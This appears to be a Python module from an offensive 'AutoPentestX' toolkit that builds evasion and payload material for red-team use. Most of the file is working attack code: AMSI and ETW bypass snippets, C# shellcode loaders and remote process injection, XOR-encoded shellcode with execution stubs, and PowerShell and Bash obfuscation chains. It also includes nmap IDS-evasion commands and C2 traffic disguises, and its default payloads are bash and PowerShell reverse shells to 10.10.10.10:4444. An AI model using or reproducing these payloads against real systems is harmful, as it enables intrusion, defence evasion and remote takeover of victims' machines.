#!/usr/bin/env python3
"""
AutoPentestX - Evasion & Obfuscation Module
Red Team: AV evasion techniques, IDS/IPS bypass, encoding chains,
payload obfuscation, traffic camouflage, and AMSI/EDR bypass templates.
"""

import base64
import random
import string
import re
import os
import json
import struct
from datetime import datetime

R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
C = '\033[96m'; M = '\033[95m'; B = '\033[1m'; X = '\033[0m'


class EvasionEngine:
    """
    Advanced evasion and obfuscation engine for Red Team operations.
    Provides encoding chains, payload mutation, traffic obfuscation,
    and evasion bypass technique references for authorized testing.
    """

    # XOR key pool
    XOR_KEYS = [0x41, 0x13, 0x37, 0xAB, 0xDE, 0xFF, 0x55, 0xAA, 0x69, 0x4D]

    # Powershell AMSI bypass templates
    AMSI_BYPASSES = {
        'amsi_patch_1': '''$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*nitFailed"){$f=$e}};$f.SetValue($null,$true)''',
        'amsi_patch_2': '''[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null).ToString().Length.GetType().GetField('AmsiContext','NonPublic,Static').GetValue($null), 0x41414141)''',
        'amsi_mem_patch': '''$mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null,$null)''',
        'bypass_clm': '[System.AppDomain]::CurrentDomain.SetData("APPDOMAIN_MANAGER_TYPE","System.AppDomain");[System.AppDomain]::CurrentDomain.SetData("APPDOMAIN_MANAGER_ASM","mscorlib")',
        'reflection_bypass': '''$a = [Ref].Assembly.GetType('System.Management.Automation.Utils');$b = $a.GetField('cachedGroupPolicySettings','NonPublic,Static');$b.SetValue($null,[System.Collections.Generic.Dictionary[String,System.Object]]::new())''',
    }

    # ETW (Event Tracing for Windows) bypass templates
    ETW_BYPASSES = {
        'etw_patch': r'''[Reflection.Assembly]::LoadWithPartialName("System.Core");$s=[System.Diagnostics.Eventing.EventProvider].GetField("m_enabled","NonPublic,Instance");[System.Diagnostics.Tracing.EventSource].GetFields("NonPublic,Static")|?{$_.Name -eq "Log"}|%{$log=$_.GetValue($null);if($log){$s.SetValue($log,$false)}}''',
    }

    # C# shellcode loader templates
    CS_LOADERS = {
        'pinvoke_basic': '''using System;
using System.Runtime.InteropServices;

class Loader {{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpAttr, uint dwSize, IntPtr lpFn, IntPtr param, uint flags, IntPtr id);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main() {{
        byte[] sc = new byte[] {{ {SHELLCODE_BYTES} }};
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, mem, sc.Length);
        IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }}
}}''',
        'process_injection': '''using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Injector {{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddr, uint dwSize, uint flType, uint flProt);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBase, byte[] buff, uint size, out int written);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr attr, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr id);

    static void Main(string[] args) {{
        byte[] sc = new byte[] {{ {SHELLCODE_BYTES} }};
        uint pid = uint.Parse(args.Length > 0 ? args[0] : "{TARGET_PID}");
        IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
        IntPtr mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        WriteProcessMemory(hProc, mem, sc, (uint)sc.Length, out int _);
        CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    }}
}}''',
    }

    # IDS/IPS evasion techniques
    IDS_EVASION_TECHNIQUES = {
        'fragmentation': 'Split packets to avoid signature detection (nmap -f flag)',
        'decoy_scanning': 'Use decoy IPs to mask real scanner (nmap -D RND:10)',
        'slow_scan': 'Reduce scan rate to evade IDS rate-based detection (nmap -T0 or -T1)',
        'source_port_spoof': 'Use common port (80,443) as source to bypass FW rules (nmap --source-port 53)',
        'append_junk': 'Append garbage data to packets to confuse DPI engines',
        'protocol_confusion': 'Use unexpected protocol encoding (e.g., IPv6 headers in IPv4)',
        'ua_rotation': 'Rotate User-Agent headers to avoid web WAF fingerprinting',
        'timing_jitter': 'Add random delays between requests to defeat behavioral analytics',
        'payload_encoding': 'Encode payloads to avoid string-based signature matches',
        'ssl_tunnel': 'Tunnel traffic through HTTPS to avoid plain-text inspection',
        'dns_tunnel': 'Exfiltrate/C2 via DNS queries (hard to block without DNS filtering)',
    }

    def __init__(self, out_dir: str = 'payloads/evasion'):
        self.out_dir = out_dir
        os.makedirs(out_dir, exist_ok=True)
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'encoded_payloads': [],
            'obfuscated_shells': [],
            'bypass_snippets': [],
            'loaders': [],
            'ids_techniques': [],
        }

    def _print(self, level: str, msg: str):
        icons = {'info': f'{C}[*]{X}', 'ok': f'{G}[✓]{X}',
                 'warn': f'{Y}[!]{X}', 'gen': f'{M}[EVA]{X}'}
        print(f'  {icons.get(level, "[?]")} {msg}')

    # ─────────────────────────────────────────────────────────
    #  1. ENCODING CHAINS
    # ─────────────────────────────────────────────────────────
    def encode_payload(self, payload: str, method: str = 'chain') -> dict:
        """Apply multiple encoding layers to evade string-based detection."""
        self._print('info', f'Encoding payload ({method})...')
        encoded = {'original': payload, 'layers': [], 'final': ''}

        current = payload

        if method in ('base64', 'chain'):
            b64 = base64.b64encode(current.encode()).decode()
            encoded['layers'].append({'method': 'base64', 'result': b64[:80] + '...'})
            current = b64
            self._print('gen', f'Base64: {Y}{b64[:60]}{X}...')

        if method in ('hex', 'chain'):
            hexed = current.encode().hex()
            encoded['layers'].append({'method': 'hex', 'result': hexed[:80] + '...'})
            current = hexed
            self._print('gen', f'Hex: {Y}{hexed[:60]}{X}...')

        if method in ('xor', 'chain'):
            key = random.choice(self.XOR_KEYS)
            xored = bytes([b ^ key for b in current.encode()])
            xor_b64 = base64.b64encode(xored).decode()
            encoded['layers'].append({'method': f'xor(key=0x{key:02x})+base64',
                                       'key': hex(key), 'result': xor_b64[:80] + '...'})
            current = xor_b64
            self._print('gen', f'XOR(0x{key:02x})+b64: {Y}{xor_b64[:60]}{X}...')

        if method == 'chain':
            # Final layer: URL encoding
            import urllib.parse
            url_enc = urllib.parse.quote(current)
            encoded['layers'].append({'method': 'url_encode', 'result': url_enc[:80] + '...'})
            current = url_enc

        encoded['final'] = current
        self.results['encoded_payloads'].append(encoded)
        return encoded

    # ─────────────────────────────────────────────────────────
    #  2. POWERSHELL OBFUSCATION
    # ─────────────────────────────────────────────────────────
    def obfuscate_powershell(self, ps_command: str) -> dict:
        """Multi-technique PowerShell obfuscation."""
        self._print('info', 'Obfuscating PowerShell command...')
        variants = {}

        # Technique 1: Base64 encoded command
        encoded_cmd = base64.b64encode(ps_command.encode('utf-16-le')).decode()
        variants['base64_encoded'] = f'powershell -NoP -NonI -W Hidden -Enc {encoded_cmd}'

        # Technique 2: IEX + download cradle
        variants['iex_b64'] = f'powershell -c "IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\'{encoded_cmd}\')))"'

        # Technique 3: Char array obfuscation
        char_array = ','.join([str(ord(c)) for c in ps_command])
        variants['char_array'] = f'powershell -c "[char[]]({char_array}) -join \'\' | IEX"'

        # Technique 4: String reversal
        reversed_cmd = ps_command[::-1]
        rev_b64 = base64.b64encode(reversed_cmd.encode('utf-16-le')).decode()
        variants['reversed'] = f'powershell -c "$c = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\'{rev_b64}\')); IEX ($c[-1..-($c.Length)] -join \'\')"'

        # Technique 5: Concatenation split (bypass simple string matching)
        mid = len(ps_command) // 2
        part1 = ps_command[:mid]
        part2 = ps_command[mid:]
        p1_b64 = base64.b64encode(part1.encode()).decode()
        p2_b64 = base64.b64encode(part2.encode()).decode()
        variants['concat_split'] = (
            f'powershell -c "$p1=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{p1_b64}\'));'
            f'$p2=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{p2_b64}\'));'
            f'IEX($p1+$p2)"'
        )

        # Technique 6: AMSI bypass + execution
        amsi = self.AMSI_BYPASSES['amsi_patch_1']
        amsi_b64 = base64.b64encode((amsi + '; ' + ps_command).encode('utf-16-le')).decode()
        variants['amsi_bypass_combined'] = f'powershell -NoP -NonI -W Hidden -Enc {amsi_b64}'

        for name, variant in variants.items():
            self._print('gen', f'{M}{name}{X}: {C}{variant[:80]}{X}...')
            self.results['obfuscated_shells'].append({
                'technique': name, 'payload': variant
            })

        return variants

    # ─────────────────────────────────────────────────────────
    #  3. BASH OBFUSCATION
    # ─────────────────────────────────────────────────────────
    def obfuscate_bash(self, bash_cmd: str) -> dict:
        """Multi-technique Bash command obfuscation."""
        self._print('info', 'Obfuscating Bash command...')
        variants = {}

        # Base64 exec
        b64 = base64.b64encode(bash_cmd.encode()).decode()
        variants['base64_exec'] = f'echo {b64} | base64 -d | bash'

        # Hex exec
        hexed = bash_cmd.encode().hex()
        variants['hex_exec'] = f'echo {hexed} | xxd -r -p | bash'

        # Var substitution (split string)
        def split_cmd(cmd):
            parts = []
            chunk = 3
            for i in range(0, len(cmd), chunk):
                parts.append(f'v{i}="{cmd[i:i+chunk]}"')
            varnames = ''.join(f'$v{i}' for i in range(0, len(cmd), chunk))
            return ';'.join(parts) + f';eval "{varnames}"'
        variants['var_split'] = split_cmd(bash_cmd)

        # IFS manipulation
        ifs_cmd = bash_cmd.replace(' ', '${IFS}')
        variants['ifs_spaces'] = ifs_cmd

        # Brace expansion for keywords
        def obscure_keywords(cmd):
            keywords = {'bash': 'ba''sh', 'exec': 'ex''ec', 'eval': 'ev''al'}
            for k, v in keywords.items():
                cmd = cmd.replace(k, v)
            return cmd
        variants['keyword_split'] = obscure_keywords(bash_cmd)

        # $() subshell
        variants['subshell'] = f'$(echo {b64} | base64 -d)'

        for name, variant in variants.items():
            self._print('gen', f'{M}{name}{X}: {C}{variant[:80]}{X}')

        self.results['obfuscated_shells'].extend([
            {'technique': n, 'payload': v} for n, v in variants.items()
        ])
        return variants

    # ─────────────────────────────────────────────────────────
    #  4. XOR SHELLCODE ENCODER
    # ─────────────────────────────────────────────────────────
    def xor_encode_shellcode(self, shellcode: bytes, key: int = None) -> dict:
        """XOR-encode a shellcode buffer with a random or specified key."""
        if key is None:
            key = random.choice(self.XOR_KEYS)

        encoded_bytes = bytes([b ^ key for b in shellcode])
        encoded_hex = ', '.join(f'0x{b:02x}' for b in encoded_bytes)
        original_hex = ', '.join(f'0x{b:02x}' for b in shellcode)

        decoder_stub_c = f'''
// XOR Decoder Stub — key = 0x{key:02x}
unsigned char encoded[] = {{ {encoded_hex} }};
unsigned char key = 0x{key:02x};
for (int i = 0; i < sizeof(encoded); i++) {{
    encoded[i] ^= key;
}}
// Execute decoded shellcode
void (*exec)() = (void(*)())encoded;
exec();
'''

        decoder_stub_python = f'''
encoded = bytes([{encoded_hex}])
key = 0x{key:02x}
decoded = bytes([b ^ key for b in encoded])
import ctypes
buf = (ctypes.c_char * len(decoded)).from_buffer_copy(decoded)
ctypes.windll.kernel32.VirtualProtect(buf, len(decoded), 0x40, ctypes.byref(ctypes.c_ulong()))
ctypes.cast(buf, ctypes.CFUNCTYPE(None))()
'''
        result = {
            'key': hex(key),
            'original_length': len(shellcode),
            'encoded_hex': encoded_hex[:200] + '...',
            'decoder_c': decoder_stub_c,
            'decoder_python': decoder_stub_python,
        }
        self._print('gen', f'XOR encoded {len(shellcode)} bytes with key {M}0x{key:02x}{X}')
        self.results['loaders'].append(result)
        return result

    # ─────────────────────────────────────────────────────────
    #  5. AMSI / ETW BYPASS SNIPPETS
    # ─────────────────────────────────────────────────────────
    def get_bypass_snippets(self) -> list:
        self._print('info', 'Compiling AMSI/ETW bypass snippets...')
        snippets = []

        for name, code in self.AMSI_BYPASSES.items():
            snippets.append({'type': 'AMSI', 'name': name, 'code': code})
            self._print('gen', f'AMSI bypass: {M}{name}{X}')

        for name, code in self.ETW_BYPASSES.items():
            snippets.append({'type': 'ETW', 'name': name, 'code': code})
            self._print('gen', f'ETW bypass: {M}{name}{X}')

        # Execution policy bypass variants
        ep_bypasses = [
            'powershell -ExecutionPolicy Bypass -File script.ps1',
            'powershell -ep bypass -c "..."',
            'Get-ExecutionPolicy -Scope CurrentUser | Set-ExecutionPolicy Unrestricted',
            'Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass',
            'powershell.exe -c ". ./script.ps1"',
            'Unblock-File -Path script.ps1; ./script.ps1',
        ]
        for ep in ep_bypasses:
            snippets.append({'type': 'ExecutionPolicy', 'name': 'bypass', 'code': ep})

        self.results['bypass_snippets'] = snippets
        return snippets

    # ─────────────────────────────────────────────────────────
    #  6. C# SHELLCODE LOADER GENERATION
    # ─────────────────────────────────────────────────────────
    def generate_cs_loader(self, loader_type: str = 'pinvoke_basic',
                            shellcode_placeholder: str = '0x90,0x90') -> dict:
        self._print('info', f'Generating C# loader: {loader_type}')
        if loader_type not in self.CS_LOADERS:
            loader_type = 'pinvoke_basic'

        code = self.CS_LOADERS[loader_type].format(
            SHELLCODE_BYTES=shellcode_placeholder,
            TARGET_PID='1234'
        )
        filename = f'{self.out_dir}/loader_{loader_type}.cs'
        with open(filename, 'w') as f:
            f.write(code)

        compile_cmd = f'csc /unsafe /out:{filename.replace(".cs",".exe")} {filename}'
        alt_cmd = f'mcs -out:{filename.replace(".cs",".exe")} {filename}'

        loader = {
            'type': loader_type,
            'filename': filename,
            'compile_cmd': compile_cmd,
            'alt_compile': alt_cmd,
            'code_preview': code[:300] + '...',
        }
        self._print('gen', f'{M}{loader_type}{X} → {G}{filename}{X}')
        self._print('info', f'Compile: {C}{compile_cmd}{X}')
        self.results['loaders'].append(loader)
        return loader

    # ─────────────────────────────────────────────────────────
    #  7. IDS/IPS EVASION REFERENCE
    # ─────────────────────────────────────────────────────────
    def generate_ids_evasion_guide(self) -> list:
        self._print('info', 'Compiling IDS/IPS evasion techniques...')
        guide = []

        for tech, desc in self.IDS_EVASION_TECHNIQUES.items():
            entry = {'technique': tech, 'description': desc}
            guide.append(entry)
            self._print('gen', f'{M}{tech}{X}: {desc}')

        # Nmap evasion commands
        nmap_evasion_cmds = [
            'nmap -f --mtu 24 {TARGET}                    # Packet fragmentation',
            'nmap -D RND:10 {TARGET}                      # Decoy scan',
            'nmap -T0 -sS {TARGET}                        # Paranoid timing',
            'nmap --source-port 53 {TARGET}               # Source port spoof (DNS)',
            'nmap --data-length 200 {TARGET}              # Append random data',
            'nmap --spoof-mac Apple {TARGET}              # MAC spoofing',
            'nmap --script=http-waf-detect {TARGET}       # WAF detection',
        ]
        guide.append({'technique': 'nmap_evasion', 'commands': nmap_evasion_cmds})
        for cmd in nmap_evasion_cmds:
            self._print('gen', f'{C}{cmd}{X}')

        self.results['ids_techniques'] = guide
        return guide

    # ─────────────────────────────────────────────────────────
    #  8. TRAFFIC CAMOUFLAGE (C2-like patterns)
    # ─────────────────────────────────────────────────────────
    def traffic_camouflage_patterns(self) -> list:
        self._print('info', 'Generating traffic camouflage patterns...')
        patterns = [
            {
                'name': 'Google Analytics Beacon',
                'desc': 'Mimic GA beacon traffic for C2 heartbeats',
                'ua': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                'url_pattern': '/collect?v=1&t=pageview&tid=UA-XXXXXX-1&cid={UUID}&dp=%2F',
            },
            {
                'name': 'CDN Static Asset',
                'desc': 'Blend C2 traffic in CDN asset requests',
                'url_pattern': '/assets/vendor/{RANDOM}.min.js',
                'headers': {'Cache-Control': 'max-age=31536000', 'X-Requested-With': 'XMLHttpRequest'},
            },
            {
                'name': 'OCSP Stapling Traffic',
                'desc': 'Use port 80 requests mimicking OCSP certificate validation',
                'url_pattern': '/ocsp/{BASE64_DATA}',
                'content_type': 'application/ocsp-request',
            },
            {
                'name': 'Slack Webhook Mimic',
                'desc': 'Tunnel C2 to look like Slack API calls',
                'url_pattern': '/api/chat.postMessage',
                'headers': {'Authorization': 'Bearer xoxb-FAKE-TOKEN'},
            },
            {
                'name': 'DNS-over-HTTPS (DoH)',
                'desc': 'C2 communication via DNS-over-HTTPS to 1.1.1.1',
                'url_pattern': 'https://cloudflare-dns.com/dns-query?name={ENCODED_DATA}&type=TXT',
                'headers': {'Accept': 'application/dns-json'},
            },
        ]

        for p in patterns:
            self._print('gen', f'{M}{p["name"]}{X}: {p["desc"]}')

        return patterns

    # ─────────────────────────────────────────────────────────
    #  ORCHESTRATION
    # ─────────────────────────────────────────────────────────
    def run_full_evasion_suite(self, sample_payload: str = None) -> dict:
        print(f'\n{C}╔══════════════════════════════════════════════════════════╗{X}')
        print(f'{C}║{X} {B}{M}[EVASION ENGINE]{X} Output: {Y}{self.out_dir}{X}')
        print(f'{C}╚══════════════════════════════════════════════════════════╝{X}\n')

        if not sample_payload:
            sample_payload = 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

        # Encode payloads
        for method in ('base64', 'hex', 'xor', 'chain'):
            self.encode_payload(sample_payload, method)

        # PowerShell obfuscation
        ps_cmd = f'$c=New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+\'> \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()'
        self.obfuscate_powershell(ps_cmd)

        # Bash obfuscation
        self.obfuscate_bash(sample_payload)

        # AMSI/ETW bypasses
        self.get_bypass_snippets()

        # C# loaders
        for loader_type in ('pinvoke_basic', 'process_injection'):
            self.generate_cs_loader(loader_type)

        # IDS evasion guide
        self.generate_ids_evasion_guide()

        # Traffic camouflage
        self.results['traffic_patterns'] = self.traffic_camouflage_patterns()

        self.results['completed_at'] = datetime.now().isoformat()

        print(f'\n{G}[✓]{X} Evasion suite complete — '
              f'{len(self.results["encoded_payloads"])} encodings | '
              f'{len(self.results["obfuscated_shells"])} obfuscated shells | '
              f'{len(self.results["bypass_snippets"])} bypass snippets | '
              f'{len(self.results["loaders"])} loaders')

        return self.results
